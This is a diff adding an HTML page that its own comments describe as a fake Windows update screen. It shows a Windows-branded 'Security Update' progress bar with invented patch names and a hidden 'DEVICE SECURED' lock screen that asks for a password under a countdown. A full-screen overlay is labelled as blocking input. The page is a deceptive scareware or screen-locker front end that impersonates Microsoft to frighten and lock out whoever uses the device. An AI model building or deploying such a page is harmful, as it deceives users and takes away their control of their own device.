@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Security Scan</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Fake Windows Update Screen -->
+        <div class="update-screen">
+            <div class="header">
+                <i class="fab fa-windows"></i>
+                <h1>Windows Security Update</h1>
+            </div>
+            
+            <div class="progress-section">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <p class="progress-text" id="progressText">Installing update 1 of 3... 25% complete</p>
+                <p class="warning"><i class="fas fa-exclamation-triangle"></i> DO NOT TURN OFF YOUR DEVICE</p>
+            </div>
+            
+            <div class="details">
+                <h3><i class="fas fa-shield-alt"></i> Security Patch Details:</h3>
+                <ul>
+                    <li>Critical Security Update KB5012345</li>
+                    <li>Malware Protection Engine v5.0</li>
+                    <li>Firewall Rule Update</li>
+                    <li>System File Verification</li>
+                </ul>
+            </div>
+            
+            <!-- Hidden Lock Screen (muncul setelah loading) -->
+            <div class="lock-screen" id="lockScreen">
+                <div class="lock-content">
+                    <i class="fas fa-lock"></i>
+                    <h2>DEVICE SECURED</h2>
+                    <p>Your system has been protected from threats</p>
+                    <div class="password-box">
+                        <input type="password" id="passwordInput" placeholder="Enter admin password">
+                        <button onclick="checkPassword()"><i class="fas fa-unlock"></i> UNLOCK</button>
+                    </div>
+                    <p class="hint">Default password: 0000</p>
+                    <div class="timer">
+                        <i class="fas fa-clock"></i> 
+                        <span id="lockTimer">05:00</span> until auto-lock
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- System Overlay (block input) -->
+        <div class="overlay" id="touchBlocker"></div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
